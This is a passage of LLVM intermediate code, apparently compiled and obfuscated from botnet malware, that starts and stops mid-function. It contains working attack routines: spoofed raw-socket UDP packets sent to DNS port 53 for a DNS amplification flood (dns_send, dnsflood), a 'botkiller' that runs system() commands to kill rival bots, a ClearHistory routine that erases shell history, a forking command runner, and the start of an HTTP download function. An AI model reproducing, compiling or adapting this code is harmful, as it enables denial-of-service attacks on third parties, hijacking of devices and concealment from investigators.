  %93 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %92, i32 0, i32 5
  store i8 64, i8* %93, align 4
  %94 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %95 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %94, i32 0, i32 6
  store i8 17, i8* %95, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 7
  store i16 0, i16* %97, align 2
  %98 = load i8*, i8** %5, align 8
  %99 = call i32 @inet_addr(i8* %98) #2
  %100 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %101 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %100, i32 0, i32 8
  store i32 %99, i32* %101, align 4
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  %105 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 9
  store i32 %104, i32* %106, align 4
  %107 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %108 = bitcast i8* %107 to i16*
  %109 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %110 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %109, i32 0, i32 2
  %111 = load i16, i16* %110, align 2
  %112 = zext i16 %111 to i32
  %113 = call zeroext i16 @csum(i16* %108, i32 %112)
  %114 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 7
  store i16 %113, i16* %115, align 2
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %117 = getelementptr inbounds i8, i8* %116, i64 20
  %118 = bitcast i8* %117 to %struct.udphdr*
  store %struct.udphdr* %118, %struct.udphdr** %19, align 8
  %119 = load i32, i32* %6, align 4
  %120 = trunc i32 %119 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #13
  %122 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %123 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.3* %123 to %struct.anon.4*
  %125 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %124, i32 0, i32 0
  store i16 %121, i16* %125, align 2
  %126 = call zeroext i16 @htons(i16 zeroext 53) #13
  %127 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.3* %128 to %struct.anon.4*
  %130 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %129, i32 0, i32 1
  store i16 %126, i16* %130, align 2
  %131 = load i8*, i8** %11, align 8
  %132 = call i64 @strlen(i8* %131) #10
  %133 = add i64 %132, 1
  %134 = add i64 20, %133
  %135 = add i64 %134, 4
  %136 = trunc i64 %135 to i16
  %137 = call zeroext i16 @htons(i16 zeroext %136) #13
  %138 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %139 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %138, i32 0, i32 0
  %140 = bitcast %union.anon.3* %139 to %struct.anon.4*
  %141 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %140, i32 0, i32 2
  store i16 %137, i16* %141, align 2
  %142 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %143 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon.3* %143 to %struct.anon.4*
  %145 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %144, i32 0, i32 3
  store i16 0, i16* %145, align 2
  %146 = load i8*, i8** %5, align 8
  %147 = call i32 @inet_addr(i8* %146) #2
  %148 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 0
  store i32 %147, i32* %148, align 4
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 4
  %152 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 1
  store i32 %151, i32* %152, align 4
  %153 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 2
  store i8 0, i8* %153, align 4
  %154 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 3
  store i8 17, i8* %154, align 1
  %155 = load i8*, i8** %11, align 8
  %156 = call i64 @strlen(i8* %155) #10
  %157 = add i64 %156, 1
  %158 = add i64 20, %157
  %159 = add i64 %158, 4
  %160 = trunc i64 %159 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #13
  %162 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 4
  store i16 %161, i16* %162, align 2
  %163 = load i8*, i8** %11, align 8
  %164 = call i64 @strlen(i8* %163) #10
  %165 = add i64 %164, 1
  %166 = add i64 32, %165
  %167 = add i64 %166, 4
  %168 = trunc i64 %167 to i32
  store i32 %168, i32* %21, align 4
  %169 = load i32, i32* %21, align 4
  %170 = sext i32 %169 to i64
  %171 = call noalias i8* @malloc(i64 %170) #2
  store i8* %171, i8** %16, align 8
  %172 = load i8*, i8** %16, align 8
  %173 = bitcast %struct.ps_hdr* %20 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %172, i8* %173, i64 12, i32 1, i1 false)
  %174 = load i8*, i8** %16, align 8
  %175 = getelementptr inbounds i8, i8* %174, i64 12
  %176 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %177 = bitcast %struct.udphdr* %176 to i8*
  %178 = load i8*, i8** %11, align 8
  %179 = call i64 @strlen(i8* %178) #10
  %180 = add i64 %179, 1
  %181 = add i64 20, %180
  %182 = add i64 %181, 4
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %175, i8* %177, i64 %182, i32 1, i1 false)
  %183 = load i8*, i8** %16, align 8
  %184 = bitcast i8* %183 to i16*
  %185 = load i32, i32* %21, align 4
  %186 = call zeroext i16 @csum(i16* %184, i32 %185)
  %187 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.3* %188 to %struct.anon.4*
  %190 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %189, i32 0, i32 3
  store i16 %186, i16* %190, align 2
  %191 = call i32 @socket(i32 2, i32 3, i32 255) #2
  store i32 %191, i32* %22, align 4
  %192 = load i32, i32* %22, align 4
  %193 = icmp eq i32 %192, -1
  br i1 %193, label %194, label %211

; <label>:194:                                    ; preds = %4
  %195 = load i32, i32* @x.107
  %196 = load i32, i32* @y.108
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %194
  %203 = load i32, i32* @x.107
  %204 = load i32, i32* @y.108
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %243

; <label>:211:                                    ; preds = %4
  %212 = load i32, i32* @x.107
  %213 = load i32, i32* @y.108
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %211
  %220 = load i32, i32* %22, align 4
  %221 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %222 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 2
  %224 = load i16, i16* %223, align 2
  %225 = zext i16 %224 to i64
  %226 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %227 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %227, %struct.sockaddr** %226, align 8
  %228 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %229 = load %struct.sockaddr*, %struct.sockaddr** %228, align 8
  %230 = call i64 @sendto(i32 %220, i8* %221, i64 %225, i32 0, %struct.sockaddr* %229, i32 16)
  %231 = load i32, i32* @x.107
  %232 = load i32, i32* @y.108
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %239

; <label>:239:                                    ; preds = %originalBBpart24
  %240 = load i8*, i8** %16, align 8
  call void @free(i8* %240) #2
  %241 = load i32, i32* %22, align 4
  %242 = call i32 @close(i32 %241)
  br label %243

; <label>:243:                                    ; preds = %239, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %194
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %211
  %244 = load i32, i32* %22, align 4
  %245 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %246 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 2
  %248 = load i16, i16* %247, align 2
  %249 = zext i16 %248 to i64
  %250 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %251 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %251, %struct.sockaddr** %250, align 8
  %252 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %253 = load %struct.sockaddr*, %struct.sockaddr** %252, align 8
  %254 = call i64 @sendto(i32 %244, i8* %245, i64 %249, i32 0, %struct.sockaddr* %253, i32 16)
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @dnsflood(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.thread_data*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [100 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %2, align 8
  %11 = call i32 @listFork()
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %14, label %13

; <label>:13:                                     ; preds = %1
  ret void

; <label>:14:                                     ; preds = %1
  %15 = load i8*, i8** %2, align 8
  %16 = bitcast i8* %15 to %struct.thread_data*
  store %struct.thread_data* %16, %struct.thread_data** %3, align 8
  %17 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %18 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %17, i32 0, i32 1
  %19 = load i8*, i8** %18, align 8
  store i8* %19, i8** %4, align 8
  %20 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %21 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %20, i32 0, i32 2
  %22 = load i32, i32* %21, align 8
  store i32 %22, i32* %5, align 4
  %23 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %24 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %23, i32 0, i32 4
  %25 = load i32, i32* %24, align 8
  store i32 %25, i32* %6, align 4
  %26 = call i64 @time(i64* null) #2
  %27 = call i32 @getpid() #2
  %28 = sext i32 %27 to i64
  %29 = xor i64 %26, %28
  %30 = trunc i64 %29 to i32
  call void @init_rand(i32 %30)
  store i32 0, i32* %8, align 4
  %31 = call i64 @time(i64* null) #2
  %32 = load i32, i32* %6, align 4
  %33 = sext i32 %32 to i64
  %34 = add nsw i64 %31, %33
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %9, align 4
  br label %36

; <label>:36:                                     ; preds = %117, %14
  %37 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %37, %struct._IO_FILE** %10, align 8
  br label %38

; <label>:38:                                     ; preds = %116, %36
  %39 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %40 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %41 = call i8* @fgets(i8* %39, i32 100, %struct._IO_FILE* %40)
  %42 = icmp ne i8* %41, null
  br i1 %42, label %43, label %117

; <label>:43:                                     ; preds = %38
  %44 = load i32, i32* @x.109
  %45 = load i32, i32* @y.110
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %43
  %52 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %53 = call i64 @strlen(i8* %52) #10
  %54 = sub i64 %53, 1
  %55 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp eq i32 %57, 10
  %59 = load i32, i32* @x.109
  %60 = load i32, i32* @y.110
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %58, label %75, label %67

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %69 = call i64 @strlen(i8* %68) #10
  %70 = sub i64 %69, 1
  %71 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 13
  br i1 %74, label %75, label %80

; <label>:75:                                     ; preds = %67, %originalBBpart2
  %76 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %77 = call i64 @strlen(i8* %76) #10
  %78 = sub i64 %77, 1
  %79 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %78
  store i8 0, i8* %79, align 1
  br label %80

; <label>:80:                                     ; preds = %75, %67
  %81 = load i8*, i8** %4, align 8
  %82 = load i32, i32* %5, align 4
  %83 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  call void @dns_send(i8* %81, i32 %82, i8* %83, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.420, i32 0, i32 0))
  %84 = load volatile i32, i32* @pps, align 4
  %85 = add i32 %84, 1
  store volatile i32 %85, i32* @pps, align 4
  %86 = load i32, i32* %8, align 4
  %87 = load volatile i32, i32* @limiter, align 4
  %88 = icmp sge i32 %86, %87
  br i1 %88, label %89, label %92

; <label>:89:                                     ; preds = %80
  store i32 0, i32* %8, align 4
  %90 = load volatile i32, i32* @sleeptime, align 4
  %91 = call i32 @usleep(i32 %90)
  br label %92

; <label>:92:                                     ; preds = %89, %80
  %93 = load i32, i32* @x.109
  %94 = load i32, i32* @y.110
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %92
  %101 = load i32, i32* %8, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %8, align 4
  %103 = call i64 @time(i64* null) #2
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = icmp sgt i64 %103, %105
  %107 = load i32, i32* @x.109
  %108 = load i32, i32* @y.110
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart218, label %originalBB7alteredBB

originalBBpart218:                                ; preds = %originalBB7
  br i1 %106, label %115, label %116

; <label>:115:                                    ; preds = %originalBBpart218
  call void @exit(i32 0) #14
  unreachable

; <label>:116:                                    ; preds = %originalBBpart218
  br label %38

; <label>:117:                                    ; preds = %38
  %118 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %119 = call i32 @fclose(%struct._IO_FILE* %118)
  br label %36

originalBBalteredBB:                              ; preds = %originalBB, %43
  %120 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %121 = call i64 @strlen(i8* %120) #10
  %_ = shl i64 %121, 1
  %_1 = sub i64 0, %121
  %gen = add i64 %_1, 1
  %_2 = shl i64 %121, 1
  %_3 = shl i64 %121, 1
  %_4 = shl i64 %121, 1
  %_5 = sub i64 0, %121
  %gen6 = add i64 %_5, 1
  %122 = sub i64 %121, 1
  %123 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp eq i32 %125, 10
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %92
  %127 = load i32, i32* %8, align 4
  %_8 = shl i32 %127, 1
  %_9 = sub i32 0, %127
  %gen10 = add i32 %_9, 1
  %_11 = sub i32 %127, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 0, %127
  %gen14 = add i32 %_13, 1
  %_15 = shl i32 %127, 1
  %_16 = shl i32 %127, 1
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %8, align 4
  %129 = call i64 @time(i64* null) #2
  %130 = load i32, i32* %9, align 4
  %131 = sext i32 %130 to i64
  %132 = icmp sgt i64 %129, %131
  br label %originalBB7
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: noinline nounwind uwtable
define void @botkiller() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [80 x i8], align 16
  br label %3

; <label>:3:                                      ; preds = %originalBBpart28, %0
  store i32 0, i32* %1, align 4
  br label %4

; <label>:4:                                      ; preds = %originalBBpart24, %3
  %5 = load i32, i32* @x.111
  %6 = load i32, i32* @y.112
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = load i32, i32* %1, align 4
  %14 = icmp slt i32 %13, 9
  %15 = load i32, i32* @x.111
  %16 = load i32, i32* @y.112
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %65

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %25 = call i32 (i8*, i8*, ...) @sprintf(i8* %24, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i32 0, i32 0)) #2
  %26 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %27 = load i32, i32* %1, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i8* @strcat(i8* %26, i8* %30) #2
  %32 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %33 = call i32 @system(i8* %32)
  %34 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %35 = call i32 (i8*, i8*, ...) @sprintf(i8* %34, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i32 0, i32 0)) #2
  %36 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %37 = load i32, i32* %1, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @strcat(i8* %36, i8* %40) #2
  %42 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %43 = call i8* @strcat(i8* %42, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0)) #2
  %44 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %45 = call i32 @system(i8* %44)
  br label %46

; <label>:46:                                     ; preds = %23
  %47 = load i32, i32* @x.111
  %48 = load i32, i32* @y.112
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i32, i32* %1, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %1, align 4
  %57 = load i32, i32* @x.111
  %58 = load i32, i32* @y.112
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %4

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* @x.111
  %67 = load i32, i32* @y.112
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %65
  %74 = call i32 @sleep(i32 5)
  %75 = load i32, i32* @x.111
  %76 = load i32, i32* @y.112
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %3
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %84 = load i32, i32* %1, align 4
  %85 = icmp slt i32 %84, 9
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %86 = load i32, i32* %1, align 4
  %_ = shl i32 %86, 1
  %_2 = sub i32 %86, 1
  %gen = mul i32 %_2, 1
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %1, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %65
  %88 = call i32 @sleep(i32 5)
  br label %originalBB6
}

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.423, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.424, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.425, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @binsBins() #0 {
  %1 = load i32, i32* @x.115
  %2 = load i32, i32* @y.116
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = call i32 @fork() #2
  store i32 %10, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  %12 = load i32, i32* @x.115
  %13 = load i32, i32* @y.116
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %11, label %20, label %24

; <label>:20:                                     ; preds = %originalBBpart2
  %21 = load i8*, i8** @rekdevice, align 8
  %22 = call i32 @system(i8* %21)
  %23 = call i32 @sleep(i32 20)
  br label %43

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* @x.115
  %26 = load i32, i32* @y.116
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  %33 = load i32, i32* %9, align 4
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.426, i32 0, i32 0), i32 %33)
  %35 = load i32, i32* @x.115
  %36 = load i32, i32* @y.116
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %43

; <label>:43:                                     ; preds = %originalBBpart24, %20
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %44 = alloca i32, align 4
  %45 = call i32 @fork() #2
  store i32 %45, i32* %44, align 4
  %46 = icmp eq i32 %45, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  %47 = load i32, i32* %9, align 4
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.426, i32 0, i32 0), i32 %47)
  br label %originalBB1
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @download(i8*, i8*) #0 {
  %3 = load i32, i32* @x.117
  %4 = load i32, i32* @y.118
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i64, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca %struct._IO_FILE*, align 8
  %21 = alloca [4096 x i8], align 16
  %22 = alloca %struct.hostent*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %27 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %27, i32* %14, align 4
  %28 = icmp eq i32 %27, -1
  %29 = load i32, i32* @x.117
  %30 = load i32, i32* @y.118
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %28, label %37, label %38

; <label>:37:                                     ; preds = %originalBBpart2
  store i32 3, i32* %11, align 4
  br label %438

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i8*, i8** %12, align 8
  %40 = call i32 @strncmp(i8* %39, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.427, i32 0, i32 0), i64 7) #10
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %47, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %44 = load i8*, i8** %12, align 8
  %45 = getelementptr inbounds i8, i8* %44, i64 7
  %46 = call i8* @strcpy(i8* %43, i8* %45) #2
  br label %67

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* @x.117
